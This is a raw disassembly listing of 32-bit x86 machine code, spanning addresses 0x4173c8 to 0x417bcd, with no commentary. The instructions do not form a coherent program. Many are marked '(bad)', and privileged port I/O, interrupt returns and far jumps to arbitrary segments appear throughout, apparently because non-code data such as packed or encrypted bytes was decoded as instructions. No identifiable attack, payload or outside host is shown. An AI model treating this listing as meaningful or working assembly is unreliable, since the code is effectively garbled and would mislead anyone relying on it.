  4173c8:	iret   
  4173c9:	mov    eax,0x1eba4878
  4173ce:	pop    ds
  4173cf:	sub    al,0x27
  4173d1:	(bad)  
  4173d3:	pop    esp
  4173d4:	fs aad 0x6
  4173d7:	test   DWORD PTR [ebp+0x2f],0xb2872b4c
  4173de:	ja     0x41739a
  4173e0:	loop   0x417458
  4173e2:	or     eax,0x9d962bc7
  4173e7:	pop    esp
  4173e8:	iret   
  4173e9:	sahf   
  4173ea:	jns    0x417414
  4173ec:	adc    bh,BYTE PTR ds:0xf33089a3
  4173f2:	test   eax,0xfc1fd281
  4173f7:	mov    esp,0xec93450
  4173fc:	fisttp DWORD PTR ds:0xe75a465e
  417402:	ror    dh,0xe0
  417405:	mov    WORD PTR [esi-0x2e530fd1],ss
  41740b:	call   esi
  41740d:	mov    ah,0xe3
  41740f:	jnp    0x4173ce
  417411:	neg    cl
  417413:	ret    0xf59a
  417416:	mov    ds:0xccd479d2,eax
  41741b:	out    dx,eax
  41741c:	xchg   esp,eax
  41741d:	dec    ebp
  41741e:	sbb    dh,BYTE PTR [eax+0x5433c923]
  417424:	add    al,0x9f
  417426:	push   ds
  417427:	or     ebp,DWORD PTR [ebp-0x63]
  41742a:	fwait
  41742b:	out    0x86,eax
  41742d:	std    
  41742e:	sub    eax,DWORD PTR [edi+0x5442ca6d]
  417434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417435:	outs   dx,DWORD PTR ds:[esi]
  417436:	fisub  DWORD PTR [eax-0x69]
  417439:	cmc    
  41743a:	xor    DWORD PTR [ebx],ecx
  41743c:	arpl   WORD PTR [esi+0x2b6b044d],bp
  417442:	inc    ecx
  417443:	imul   ecx,DWORD PTR [ebp+0x47],0xffffffd3
  417447:	sub    edi,DWORD PTR [eax]
  417449:	xor    eax,0x63d82919
  41744e:	mov    ebx,DWORD PTR [ebx]
  417450:	xchg   edx,esi
  417452:	inc    esi
  417453:	ret    
  417454:	sbb    eax,0x5f8077b9
  417459:	dec    eax
  41745a:	push   esi
  41745b:	std    
  41745c:	mov    bh,0x5d
  41745e:	dec    ebx
  41745f:	in     al,0xf1
  417461:	mov    ds:0x29ee2272,eax
  417466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417467:	mov    ds:0xd69273d2,al
  41746c:	fldenv [edx+esi*1]
  41746f:	pop    edi
  417470:	mov    edx,0xdab97e07
  417475:	pop    ds
  417476:	jmp    0x4174b9
  417478:	sahf   
  417479:	mov    ah,0x3
  41747b:	es mov ebp,0xa5dcd1c4
  417481:	sbb    esi,DWORD PTR [ebx]
  417483:	xlat   BYTE PTR ds:[ebx]
  417484:	push   ds
  417485:	mov    WORD PTR [esi+0x3024a6],gs
  41748b:	adc    al,ah
  41748d:	pop    ss
  41748e:	aad    0x8
  417490:	leave  
  417491:	fidiv  WORD PTR [esi-0x2e]
  417494:	ret    0xd4a6
  417497:	retf   
  417498:	mov    esi,0x5f7f9c36
  41749d:	xchg   ecx,eax
  41749e:	dec    ebx
  41749f:	jge    0x417497
  4174a1:	xchg   esi,eax
  4174a2:	dec    esp
  4174a3:	paddw  mm4,QWORD PTR [ebx-0xa]
  4174a7:	icebp  
  4174a8:	or     ah,cl
  4174aa:	pusha  
  4174ab:	imul   edx,ebp,0xa3b1cbc4
  4174b1:	retf   0x49f3
  4174b4:	lock stos DWORD PTR es:[edi],eax
  4174b6:	in     eax,0xb1
  4174b8:	in     al,dx
  4174b9:	and    esi,edi
  4174bb:	dec    edi
  4174bc:	xor    al,0xcc
  4174be:	mov    ds:0x592204a9,eax
  4174c3:	jbe    0x417529
  4174c5:	sbb    BYTE PTR [ecx+0x7f43165f],cl
  4174cb:	addr16 push esi
  4174cd:	(bad)  
  4174ce:	sar    BYTE PTR [esi+0x78e56aa2],1
  4174d4:	xchg   ebx,eax
  4174d5:	cmp    al,BYTE PTR [ecx-0x624a622f]
  4174db:	mov    ds:0x5b3bad9b,al
  4174e0:	sub    bl,BYTE PTR [esi-0x4f]
  4174e3:	inc    edx
  4174e4:	xor    edi,DWORD PTR [ebx+edx*4-0x30362325]
  4174eb:	in     al,0x57
  4174ed:	(bad)  
  4174ee:	mov    eax,ds:0xb13e8502
  4174f3:	push   ebp
  4174f4:	(bad)  
  4174f5:	cmp    al,cl
  4174f7:	xchg   ecx,eax
  4174f8:	clc    
  4174f9:	adc    BYTE PTR [ebp+0x36],cl
  4174fc:	test   eax,0x37e0345e
  417501:	(bad)  
  417502:	dec    ecx
  417503:	mov    ds:0xbf94b7ca,al
  417508:	shr    DWORD PTR [ebx+0x69],cl
  41750b:	scas   eax,DWORD PTR es:[edi]
  41750c:	int3   
  41750d:	out    0xa5,eax
  41750f:	jecxz  0x417524
  417511:	and    ebp,DWORD PTR [edi]
  417513:	or     cl,cl
  417515:	pop    esi
  417516:	push   cs
  417517:	inc    ecx
  417518:	mov    eax,ds:0x97e87e2a
  41751d:	pop    esp
  41751e:	test   DWORD PTR [ecx+eax*2-0x46],ebx
  417522:	rcr    ch,1
  417524:	mov    ebx,0x440c87ab
  417529:	cli    
  41752a:	ror    ebx,1
  41752c:	fs push ss
  41752e:	(bad)  
  41752f:	jp     0x417580
  417531:	fldcw  WORD PTR [ecx-0x1a]
  417534:	jecxz  0x41758d
  417536:	sahf   
  417537:	fadd   QWORD PTR [ebx+edx*8+0x6f]
  41753b:	cli    
  41753c:	fistp  DWORD PTR [ebp+esi*8+0x25ee844d]
  417543:	cli    
  417544:	test   eax,0x912c1d2c
  417549:	mov    ebx,0x63df06ef
  41754e:	mov    WORD PTR [ebp+0x5d0ea51b],fs
  417554:	and    edi,DWORD PTR [ecx+0x2c78e871]
  41755a:	adc    ch,BYTE PTR [esi+0x1b]
  41755d:	test   BYTE PTR [ecx+0x92e947e],bl
  417563:	xor    ecx,DWORD PTR [ebx+eiz*4]
  417566:	mov    al,ds:0x45a33191
  41756b:	ja     0x4174f4
  41756d:	call   0x17a0:0xa00c4895
  417574:	push   edi
  417575:	jl     0x417510
  417577:	mov    ecx,0xc6ed9a60
  41757c:	push   esp
  41757d:	int3   
  41757e:	inc    esp
  41757f:	fisttp DWORD PTR [edx]
  417581:	in     eax,0xc1
  417583:	(bad)  
  417584:	push   edx
  417585:	out    dx,eax
  417586:	mov    cl,0x92
  417588:	sahf   
  417589:	jnp    0x4175b5
  41758b:	pop    eax
  41758c:	mov    esp,0x5566a7c3
  417591:	mov    cl,0x9d
  417593:	sub    al,0xbe
  417595:	lods   al,BYTE PTR ds:[esi]
  417596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417597:	jecxz  0x4175e3
  417599:	out    0x59,eax
  41759b:	and    al,0x67
  41759d:	jae    0x41757f
  41759f:	out    dx,eax
  4175a0:	test   eax,0x8706694c
  4175a5:	loope  0x4175af
  4175a7:	iret   
  4175a8:	jbe    0x4175de
  4175aa:	inc    ebx
  4175ab:	pop    ds
  4175ac:	xchg   ebp,eax
  4175ad:	imul   ebp,DWORD PTR [ebp-0x65],0x33bb4d21
  4175b4:	mov    edi,0x3bba4640
  4175b9:	sti    
  4175ba:	ficom  DWORD PTR [edx+0x750c7c3b]
  4175c0:	je     0x417566
  4175c2:	cs popf 
  4175c4:	jnp    0x41761c
  4175c6:	xchg   DWORD PTR [edx-0x7de0349a],esi
  4175cc:	cmp    ebp,edx
  4175ce:	sbb    DWORD PTR [ebx],ecx
  4175d0:	sbb    BYTE PTR [ecx+edx*8],0x9f
  4175d4:	ror    BYTE PTR [esi],0xd9
  4175d7:	xchg   edx,eax
  4175d8:	(bad)  
  4175d9:	xchg   edi,eax
  4175da:	cmp    BYTE PTR [ebx-0xa],dl
  4175dd:	sar    DWORD PTR [ebp+0x731424cd],0x3a
  4175e4:	or     ecx,esp
  4175e6:	stos   BYTE PTR es:[edi],al
  4175e7:	inc    eax
  4175e8:	pop    edx
  4175e9:	xlat   BYTE PTR ds:[ebx]
  4175ea:	jecxz  0x417662
  4175ec:	shl    BYTE PTR [ebx-0x6e2d38f8],0x60
  4175f3:	adc    DWORD PTR [esi-0x39],esp
  4175f6:	jecxz  0x41758f
  4175f8:	ja     0x417611
  4175fa:	test   bh,0x2a
  4175fd:	xor    DWORD PTR [ebx-0x33],0x7
  417601:	jge    0x417642
  417603:	xchg   esp,eax
  417604:	push   ebx
  417605:	cli    
  417606:	inc    esi
  417607:	xchg   esp,eax
  417608:	mov    esi,0x816b5c3f
  41760d:	push   esi
  41760e:	cld    
  41760f:	iret   
  417610:	dec    esi
  417611:	mov    dl,0x15
  417613:	push   esi
  417615:	pop    esp
  417616:	mov    edx,0x763abacd
  41761b:	push   es
  41761c:	addr16 (bad) 
  41761f:	int    0x12
  417621:	dec    esi
  417622:	push   0xdc88d1bd
  417627:	xor    BYTE PTR [edi+edx*4-0x51],bh
  41762b:	fst    QWORD PTR [ebp-0x51]
  41762e:	out    0x6,al
  417630:	xlat   BYTE PTR ds:[ebx]
  417631:	lds    edi,FWORD PTR [eax]
  417633:	js     0x417681
  417635:	pop    eax
  417636:	fnstenv [esi+0x2f]
  417639:	adc    DWORD PTR [edx-0x34],0xbe80a6e6
  417640:	gs mov cl,0x73
  417643:	in     eax,0x58
  417645:	jecxz  0x417666
  417647:	xor    al,0x8c
  417649:	les    ebp,FWORD PTR [di]
  41764c:	push   ebp
  41764d:	pop    edi
  41764e:	ror    DWORD PTR [ecx-0xe2be638],1
  417654:	or     ebp,DWORD PTR ds:0xbaadb872
  41765a:	hlt    
  41765b:	pop    edx
  41765c:	in     al,0x89
  41765e:	xor    dl,BYTE PTR [edi-0x70]
  417661:	loopne 0x41769a
  417663:	mov    cl,0x31
  417665:	imul   DWORD PTR [edi+0xa]
  417668:	ss jge 0x41761d
  41766b:	int    0xda
  41766d:	addr16 push ecx
  41766f:	jl     0x417654
  417671:	push   0x15
  417673:	retf   0x70e4
  417676:	add    eax,0xbb38ca25
  41767b:	int3   
  41767c:	test   al,0x2a
  41767e:	and    BYTE PTR [eiz*4-0x34d32ed2],bh
  417685:	loopne 0x4176a3
  417687:	xchg   ebp,eax
  417688:	xchg   ecx,eax
  417689:	cs push ss
  41768b:	jge    0x4176af
  41768d:	pusha  
  41768e:	push   ecx
  41768f:	retf   
  417690:	fs adc ebx,edx
  417693:	push   cs
  417694:	mov    ah,0x70
  417696:	xor    cl,al
  417698:	out    0x91,al
  41769a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41769b:	xchg   ch,dl
  41769d:	(bad)  
  41769e:	lahf   
  41769f:	mov    dh,0x98
  4176a1:	mov    al,0x3d
  4176a3:	fs std 
  4176a5:	dec    ebp
  4176a6:	bound  ebp,QWORD PTR [eax+eax*4+0x31]
  4176aa:	jae    0x417707
  4176ac:	mov    esi,0xb77edfcc
  4176b1:	xor    BYTE PTR [edi+eiz*2-0x39],bh
  4176b5:	jl     0x417670
  4176b7:	jle    0x417658
  4176b9:	push   ebx
  4176ba:	push   ecx
  4176bb:	imul   eax,DWORD PTR [ebp+edx*4-0x5cd9f00e],0x50
  4176c3:	push   0xffffff9e
  4176c5:	inc    ecx
  4176c6:	jb     0x417682
  4176c8:	add    ch,BYTE PTR [ebp-0x61bbc8b9]
  4176ce:	and    edx,DWORD PTR fs:[edi-0x5e]
  4176d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176d3:	jp     0x417657
  4176d5:	ins    BYTE PTR es:[edi],dx
  4176d6:	jne    0x417699
  4176d8:	xchg   BYTE PTR [edx],bh
  4176da:	gs pop edi
  4176dc:	cmp    al,0x10
  4176de:	in     al,0x5e
  4176e0:	scas   al,BYTE PTR es:[edi]
  4176e1:	pushf  
  4176e2:	push   esi
  4176e3:	xor    edx,ecx
  4176e5:	loop   0x4176d5
  4176e7:	mov    gs,WORD PTR [eax-0x68]
  4176ea:	jno    0x41768e
  4176ec:	jb     0x4176bc
  4176ee:	fist   DWORD PTR [ebp+0x43]
  4176f1:	mov    ebx,0x4e98adec
  4176f6:	jno    0x417736
  4176f8:	mov    ds:0x8633d684,eax
  4176fd:	mov    dh,0x38
  4176ff:	dec    esp
  417700:	daa    
  417701:	jp     0x4176bd
  417703:	mov    esp,0x567b5c4a
  417708:	jmp    0xd2ad2c9e
  41770d:	xor    eax,0x7f074812
  417712:	outs   dx,DWORD PTR ds:[esi]
  417713:	cmp    DWORD PTR [esp+eax*2],0x2
  417717:	mov    DWORD PTR [ebp-0x60377548],ebp
  41771d:	ds ja  0x4176f2
  417720:	xor    DWORD PTR [eax+eax*2],ecx
  417723:	inc    ebp
  417724:	cmp    dl,BYTE PTR [ebp+0x1798753b]
  41772a:	stos   DWORD PTR es:[edi],eax
  41772b:	or     DWORD PTR [ebx-0x4e],0x8b55fc7d
  417732:	and    BYTE PTR ds:0x19eba482,0x56
  417739:	inc    ebp
  41773a:	xchg   edx,eax
  41773b:	mov    edx,DWORD PTR [ebx+0x6]
  41773e:	jg     0x4176fe
  417740:	push   ecx
  417741:	mov    esp,0x117d1a73
  417746:	popf   
  417747:	xchg   ebp,eax
  417748:	addr16 das 
  41774a:	outs   dx,BYTE PTR ds:[esi]
  41774b:	add    ch,cl
  41774d:	ss imul edx,esp,0x8e4ba13b
  417754:	out    0xc0,al
  417756:	mov    dh,0x85
  417758:	adc    DWORD PTR [ecx+esi*8],eax
  41775b:	sub    DWORD PTR [ecx],esi
  41775d:	xor    eax,0xc3a99a02
  417762:	adc    ch,BYTE PTR [edx]
  417764:	xchg   DWORD PTR [esi-0x11d3afe9],edx
  41776a:	cmp    eax,0x94208cf1
  41776f:	repnz fsubr QWORD PTR [esi-0x64b3c01c]
  417776:	mov    ds,WORD PTR ss:[ebx-0x6a3186e7]
  41777d:	sahf   
  41777e:	sbb    BYTE PTR [edx],cl
  417780:	cdq    
  417781:	xchg   ebx,eax
  417782:	lods   eax,DWORD PTR ds:[esi]
  417783:	jmp    0x19fa22bc
  417788:	(bad)  [ebx+edx*8]
  41778b:	mov    esp,0x34a49fe6
  417790:	jmp    0x949e:0xa83f8d23
  417797:	xchg   BYTE PTR [edx-0x239e23fb],dh
  41779d:	call   0x42b1:0x5f369535
  4177a4:	pop    bp
  4177a6:	in     eax,dx
  4177a7:	(bad)  
  4177a9:	je     0x41782a
  4177ab:	(bad)  
  4177ac:	push   ecx
  4177ad:	sbb    al,0xfd
  4177af:	mov    ebx,edx
  4177b1:	cli    
  4177b2:	test   al,0x5b
  4177b4:	in     eax,0xbf
  4177b6:	repz dec DWORD PTR [edi-0x5a752b47]
  4177bd:	inc    eax
  4177be:	mov    ebp,0x945d72be
  4177c3:	mov    ebp,eax
  4177c5:	pop    ss
  4177c6:	xor    BYTE PTR ss:[ecx-0x1bac971],bl
  4177cd:	mov    dh,0x76
  4177cf:	js     0x4177be
  4177d1:	push   ss
  4177d2:	mov    edi,0x71db6e3d
  4177d8:	pop    esi
  4177d9:	je     0x41779e
  4177db:	mov    ds:0x46fcc73d,al
  4177e0:	or     al,0xcf
  4177e2:	sbb    ah,ch
  4177e4:	fstp   DWORD PTR [edx*2-0x753c1b3e]
  4177eb:	adc    ebx,eax
  4177ed:	mov    ch,BYTE PTR [eax-0x56]
  4177f0:	in     al,dx
  4177f1:	imul   edi,DWORD PTR ds:0xf9cbe961,0x5cfea6a8
  4177fb:	mov    ebx,0x4032ce3a
  417800:	ret    0xdd57
  417803:	cmp    al,0x44
  417805:	mov    al,ds:0x18c1fb33
  41780a:	lahf   
  41780b:	retf   0xcadb
  41780e:	xor    eax,0x9572e7f0
  417813:	lock call 0xa74cec7
  417819:	sbb    edx,esi
  41781b:	imul   ebp,DWORD PTR [esi-0x47ec05b9],0xffffffc2
  417822:	xlat   BYTE PTR ds:[ebx]
  417823:	push   ecx
  417824:	sahf   
  417825:	cmp    DWORD PTR [edx],ecx
  417827:	or     BYTE PTR [ebp+0xc],ch
  41782a:	popa   
  41782b:	mov    esi,0x7e80c43d
  417830:	jmp    0xe3f7:0x446133bf
  417837:	cwde   
  417838:	ret    
  417839:	mov    ecx,0x41fed6fc
  41783e:	push   ss
  41783f:	cli    
  417840:	xchg   DWORD PTR [edi],ecx
  417842:	pop    ebx
  417843:	ds xor al,0xd0
  417846:	mov    dl,0x89
  417848:	aaa    
  417849:	sub    bl,bh
  41784b:	bnd call ebx
  41784e:	retf   0x84b
  417851:	in     eax,dx
  417852:	push   ss
  417853:	xchg   DWORD PTR [eax],edx
  417855:	rcr    BYTE PTR [esi+0x584355e5],cl
  41785b:	shr    ch,1
  41785d:	popa   
  41785e:	ficomp DWORD PTR [eax+0x8]
  417861:	sti    
  417862:	call   0x256:0xc0f9da32
  417869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41786a:	jmp    0x417843
  41786c:	mov    esi,cs
  41786e:	inc    edi
  41786f:	adc    BYTE PTR [edx-0x4d],cl
  417872:	pushf  
  417873:	leave  
  417874:	push   cs
  417875:	or     DWORD PTR [esi],ecx
  417877:	xor    al,0x39
  417879:	inc    ebx
  41787a:	and    DWORD PTR [eax+0x7a],eax
  41787d:	retf   
  41787e:	jbe    0x417805
  417880:	and    BYTE PTR [ebx-0x1690e4a8],0xb1
  417887:	mov    esi,0x5336fb4b
  41788c:	pop    eax
  41788d:	fwait
  41788e:	mov    DWORD PTR [ecx-0x17fd7b88],0x24225faa
  417898:	pop    ss
  417899:	retf   0x3f86
  41789c:	and    BYTE PTR [eax-0x19],bh
  41789f:	inc    ebx
  4178a0:	sub    DWORD PTR [ebp-0x18],ebx
  4178a3:	mov    BYTE PTR [edx+ecx*8],ah
  4178a6:	scas   al,BYTE PTR es:[edi]
  4178a7:	adc    ecx,DWORD PTR [ebp+0x40]
  4178aa:	loopne 0x4178e1
  4178ac:	into   
  4178ad:	les    edx,FWORD PTR [ebx+0x53995513]
  4178b3:	es loopne 0x4178be
  4178b6:	gs pusha 
  4178b8:	adc    DWORD PTR [ecx-0x7d9ce43d],ebx
  4178be:	imul   ecx,DWORD PTR [edi+0x6420358b],0x738a4128
  4178c8:	adc    esi,ebx
  4178ca:	xchg   ebx,eax
  4178cb:	mov    ch,0x10
  4178cd:	cmc    
  4178ce:	ficomp WORD PTR [edi]
  4178d0:	sub    cl,BYTE PTR [edx-0x14]
  4178d3:	mov    edx,0x3bf917f8
  4178d8:	addr16 sbb eax,edx
  4178db:	pop    edx
  4178dc:	ss jp  0x4178b9
  4178df:	mov    bh,0x4
  4178e1:	arpl   WORD PTR [ecx+0x4acbf1c1],di
  4178e7:	clc    
  4178e8:	sub    al,bh
  4178ea:	dec    eax
  4178eb:	int    0xe9
  4178ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ee:	mov    ah,0xb0
  4178f0:	push   edi
  4178f1:	fnsave [ebp-0x49b0af5b]
  4178f7:	xchg   ebx,eax
  4178f8:	lds    ecx,FWORD PTR ds:0x97cd056
  4178fe:	jge    0x4178e7
  417900:	int3   
  417901:	rcl    edi,cl
  417903:	(bad)  [edx+0x35dd3ba1]
  417909:	out    dx,al
  41790a:	nop
  41790b:	mov    ebp,0x86d11cda
  417910:	lahf   
  417911:	and    eax,ecx
  417913:	cmc    
  417914:	iret   
  417915:	test   ecx,ebp
  417917:	push   eax
  417918:	out    0xf3,eax
  41791a:	cmp    edi,DWORD PTR [ecx]
  41791c:	jbe    0x4178d8
  41791e:	jecxz  0x417903
  417920:	les    esi,FWORD PTR [ecx-0xec1ac53]
  417926:	lods   eax,DWORD PTR ds:[esi]
  417927:	and    DWORD PTR [edx],esp
  417929:	jle    0x41793d
  41792b:	outs   dx,DWORD PTR ds:[esi]
  41792c:	pop    ebp
  41792d:	sbb    al,0x54
  41792f:	dec    ebx
  417930:	add    eax,0xe856b2fe
  417935:	and    DWORD PTR [ecx+0x51d14281],0x67737e7d
  41793f:	xchg   ebp,eax
  417940:	mov    ecx,0x6c0fd1c0
  417945:	inc    edx
  417946:	mov    ecx,0x189b6010
  41794b:	ret    0xbebf
  41794e:	pop    ds
  41794f:	add    DWORD PTR [ebx-0x289dea32],0x9a5fc269
  417959:	call   0x98ee:0x29946708
  417960:	cmc    
  417961:	mov    bh,0x23
  417963:	pop    es
  417964:	mov    DWORD PTR [esi],edi
  417966:	in     al,0xb7
  417968:	arpl   WORD PTR ds:0x4fc5362a,sp
  41796e:	out    dx,eax
  41796f:	or     al,0xa6
  417971:	add    dh,al
  417973:	or     edx,edx
  417975:	push   ebx
  417976:	jecxz  0x417993
  417978:	jge    0x4178fe
  41797a:	xchg   ecx,eax
  41797b:	sbb    edx,DWORD PTR [edx]
  41797d:	inc    ebp
  41797e:	mov    bh,0x35
  417980:	(bad)  
  417981:	jo     0x417934
  417983:	pop    DWORD PTR [edi]
  417985:	xchg   edi,eax
  417986:	jmp    ebx
  417988:	xchg   ecx,eax
  417989:	stc    
  41798a:	sub    BYTE PTR [eax],0x3e
  41798d:	lock lods eax,DWORD PTR ds:[esi]
  41798f:	push   ebx
  417990:	(bad)  
  417991:	leave  
  417992:	sub    al,0x11
  417994:	outs   dx,DWORD PTR ds:[esi]
  417995:	push   eax
  417996:	paddw  mm1,QWORD PTR [edx+0x16]
  41799a:	out    0xf9,al
  41799c:	ror    BYTE PTR [ebx],0x15
  41799f:	not    edx
  4179a1:	rcr    DWORD PTR [ebx],0xfc
  4179a4:	bound  edx,QWORD PTR [edi+0x71]
  4179a7:	xor    dl,BYTE PTR [edx]
  4179a9:	fwait
  4179aa:	std    
  4179ab:	stos   DWORD PTR es:[edi],eax
  4179ac:	jl     0x4179da
  4179ae:	jecxz  0x4179c0
  4179b0:	and    eax,0x91f6b0d2
  4179b5:	jb     0x4179ff
  4179b7:	test   eax,0x11cb3b4b
  4179bc:	iret   
  4179bd:	dec    esp
  4179be:	adc    DWORD PTR [edx],ebp
  4179c0:	leave  
  4179c1:	(bad)  
  4179c3:	adc    edx,0x48
  4179c6:	loopne 0x417a3e
  4179c8:	jmp    0x417a36
  4179ca:	dec    ecx
  4179cb:	add    ecx,DWORD PTR [esi-0x7f988577]
  4179d1:	sub    al,0x8a
  4179d3:	cld    
  4179d4:	addr16 mov ebx,ebx
  4179d7:	mov    esi,0xb0bc5f37
  4179dc:	ss in  eax,0x57
  4179df:	xchg   ebp,eax
  4179e0:	pop    esi
  4179e1:	cmc    
  4179e2:	or     edi,DWORD PTR [ebp+0x3c]
  4179e5:	loop   0x417968
  4179e7:	mov    eax,ds:0xf7631a69
  4179ec:	mov    ebp,0x725344f4
  4179f1:	inc    eax
  4179f2:	cmp    BYTE PTR [esi-0x4e],0x85
  4179f6:	cmc    
  4179f7:	adc    BYTE PTR [edi],ch
  4179f9:	fidivr DWORD PTR [ecx]
  4179fb:	pop    edx
  4179fc:	loop   0x417a54
  4179fe:	xor    eax,0xb6e49600
  417a03:	gs dec ebp
  417a05:	mov    DWORD PTR [edx+edx*2+0x6a7567f5],edi
  417a0c:	outs   dx,BYTE PTR ds:[esi]
  417a0d:	and    al,0xd0
  417a0f:	gs scas al,BYTE PTR es:[edi]
  417a11:	jl     0x417a68
  417a13:	inc    BYTE PTR ds:[edx-0x3ea9707c]
  417a1a:	mov    esi,0xef0b757e
  417a1f:	or     BYTE PTR ds:0x28ec0821,cl
  417a25:	xor    eax,0x6f33e15a
  417a2a:	sar    DWORD PTR [esi+0x32b11497],1
  417a30:	adc    edi,edi
  417a32:	xchg   esi,eax
  417a33:	ror    BYTE PTR [ebx-0xcb56461],1
  417a39:	xlat   BYTE PTR ds:[ebx]
  417a3a:	sub    DWORD PTR [eax-0x74563b5b],esp
  417a40:	dec    ebx
  417a41:	not    DWORD PTR [ebx-0x6f]
  417a44:	mov    WORD PTR [ebx+0x1ab0777],gs
  417a4a:	lock or eax,0xf54707b
  417a50:	lods   eax,DWORD PTR ds:[esi]
  417a51:	out    dx,eax
  417a52:	jp     0x417a34
  417a54:	fmul   DWORD PTR [ebx-0x80]
  417a57:	out    dx,al
  417a58:	pop    esi
  417a59:	push   0xb8fbded9
  417a5e:	icebp  
  417a5f:	mov    BYTE PTR [edi+0x53ad2ef6],dh
  417a65:	and    eax,0xfc696716
  417a6a:	or     al,0x5a
  417a6c:	inc    edx
  417a6d:	cmp    bl,bl
  417a6f:	dec    esi
  417a70:	xchg   ebx,eax
  417a71:	fcomp  DWORD PTR [ebx]
  417a73:	pop    ebx
  417a74:	sub    al,0x6d
  417a76:	out    dx,al
  417a77:	dec    ebx
  417a78:	mov    bh,0x1d
  417a7a:	xchg   esi,eax
  417a7b:	sahf   
  417a7c:	dec    ecx
  417a7d:	scas   eax,DWORD PTR es:[edi]
  417a7e:	(bad)  
  417a7f:	retf   
  417a80:	out    dx,eax
  417a81:	add    al,0x4f
  417a83:	add    DWORD PTR [bp+di+0x7467],edx
  417a88:	add    eax,ebx
  417a8a:	xchg   ebx,eax
  417a8b:	cdq    
  417a8c:	cmp    eax,0x9f6048a7
  417a91:	push   ebp
  417a92:	addr16 mov dl,ah
  417a95:	scas   eax,DWORD PTR es:[edi]
  417a96:	mov    ecx,0x8c75383c
  417a9b:	test   BYTE PTR [ecx-0x1601a47b],0xee
  417aa2:	sub    edx,DWORD PTR [ecx+0x571c5b05]
  417aa8:	xchg   ax,ax
  417aaa:	(bad)  [ecx+eiz*4]
  417aad:	es into 
  417aaf:	mov    bl,0x1f
  417ab1:	adc    ebp,DWORD PTR [ecx-0x37]
  417ab4:	dec    ebx
  417ab5:	mov    ecx,0xee0ed1ad
  417aba:	popa   
  417abb:	jmp    0x417ac6
  417abd:	inc    edx
  417abe:	xchg   esp,eax
  417abf:	ret    0x2902
  417ac2:	(bad)  
  417ac3:	sub    al,0x8f
  417ac5:	in     al,0x23
  417ac7:	mov    dl,0x60
  417ac9:	xchg   ebx,eax
  417aca:	mov    ebp,0x930c887c
  417acf:	(bad)  
  417ad0:	cli    
  417ad1:	ss add dh,bh
  417ad4:	retf   
  417ad5:	scas   al,BYTE PTR es:[edi]
  417ad6:	mov    bh,0x32
  417ad8:	mov    DWORD PTR [edi-0x6746346],ecx
  417ade:	sbb    DWORD PTR [ebp-0x39d1fd65],0xfffffff8
  417ae5:	xchg   edx,eax
  417ae6:	add    BYTE PTR [ecx+0x397f1eaa],0xfd
  417aed:	shl    ebp,cl
  417aef:	push   edx
  417af0:	pop    esi
  417af1:	shl    DWORD PTR [ebx+0x10bb5bac],cl
  417af7:	retf   
  417af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417af9:	and    BYTE PTR [edi+0x7c],dl
  417afc:	(bad)  
  417afd:	hlt    
  417afe:	lods   al,BYTE PTR ds:[esi]
  417aff:	pop    edi
  417b00:	pop    esp
  417b01:	jge    0x417b1d
  417b03:	add    edx,DWORD PTR [ebp+0x476ec7e5]
  417b09:	jnp    0x417aae
  417b0b:	nop
  417b0c:	clc    
  417b0d:	push   eax
  417b0e:	pop    eax
  417b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b10:	mov    BYTE PTR [edx+0x72],al
  417b13:	int3   
  417b14:	sub    DWORD PTR [ecx-0x7],edx
  417b17:	sar    BYTE PTR [ecx-0x4090ed7],cl
  417b1d:	lods   al,BYTE PTR ds:[esi]
  417b1e:	lock or bl,ah
  417b21:	sbb    bl,BYTE PTR [esi+0x4d70ce3f]
  417b27:	(bad)  
  417b28:	sub    cl,BYTE PTR [edx+0x69d3cd49]
  417b2e:	(bad)  
  417b30:	call   0x42775ed3
  417b35:	shr    esp,cl
  417b37:	shl    BYTE PTR [ebp-0x5e4ad19f],0xa6
  417b3e:	dec    edx
  417b3f:	xchg   ebp,eax
  417b40:	pop    es
  417b41:	jae    0x417b45
  417b43:	out    dx,al
  417b44:	adc    ecx,ebp
  417b46:	mov    ebx,gs
  417b48:	(bad)  
  417b49:	repz fwait
  417b4b:	enter  0x109a,0x19
  417b4f:	dec    ebp
  417b50:	mov    bl,0x97
  417b52:	scas   eax,DWORD PTR es:[edi]
  417b53:	mov    esp,ds
  417b55:	jno    0x417b94
  417b57:	js     0x417b56
  417b59:	mov    ch,0x9b
  417b5b:	cli    
  417b5c:	xchg   esi,eax
  417b5d:	push   eax
  417b5e:	sub    esp,0x61a00bb3
  417b64:	dec    ebx
  417b65:	xor    al,BYTE PTR [ebx+esi*8+0x75]
  417b69:	fs in  al,dx
  417b6b:	dec    ebp
  417b6c:	xchg   ebp,eax
  417b6d:	jmp    0xb3ab:0xefb18dd7
  417b74:	shl    bh,cl
  417b76:	shr    DWORD PTR [ebp-0x15],1
  417b79:	enter  0xe3a,0x8e
  417b7d:	imul   eax,DWORD PTR [eax+0x25d106ef],0xffffffb5
  417b84:	pop    edi
  417b85:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417b87:	push   esi
  417b88:	mov    ebp,0x2bac054d
  417b8d:	mov    BYTE PTR [eax],al
  417b8f:	xchg   esp,eax
  417b90:	fwait
  417b91:	jo     0x417bb2
  417b93:	bswap  esi
  417b95:	leave  
  417b96:	fidiv  WORD PTR [ebp+eax*2-0x6a49c143]
  417b9d:	push   ebp
  417b9e:	jo     0x417c18
  417ba0:	repz test al,0x2a
  417ba3:	mov    ecx,0xef8cfe8c
  417ba8:	mov    ch,0xc7
  417baa:	jns    0x417b93
  417bac:	or     eax,0x5e1bbdb2
  417bb1:	pushf  
  417bb2:	mov    cl,0x24
  417bb4:	mov    edi,ds
  417bb6:	mov    eax,ds:0x9f405cff
  417bbb:	(bad)  
  417bbd:	dec    edi
  417bbe:	data16 jns 0x417c3f
  417bc1:	stc    
  417bc2:	fs pop eax
  417bc4:	jnp    0x417b6d
  417bc6:	and    esp,edx
  417bc8:	jg     0x417bd0
  417bca:	pusha  
  417bcb:	inc    edi
  417bcc:	xlat   BYTE PTR ds:[ebx]
  417bcd:	out    0x2b,eax
